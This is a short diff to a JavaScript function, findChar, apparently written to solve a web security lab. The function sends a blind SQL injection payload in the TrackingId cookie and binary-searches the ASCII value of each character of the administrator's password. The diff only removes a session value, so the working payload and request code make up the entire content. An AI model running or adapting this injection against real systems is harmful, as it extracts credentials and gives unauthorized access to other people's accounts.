@@ -23,7 +23,7 @@ async function findChar(i) {
     const options = {
       method: "GET",
       headers: {
-        Cookie: `TrackingId=BlzXFEUoJcpSPeyv' and (select ascii(substring(password,${i},1)) from users where username='administrator')>${middle}-- ; session=jNtHoYLdZR0uT4BU5i2UzrqhVazM5NWa`,
+        Cookie: `TrackingId=BlzXFEUoJcpSPeyv' and (select ascii(substring(password,${i},1)) from users where username='administrator')>${middle}-- `,
         "User-Agent":
           "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
       },
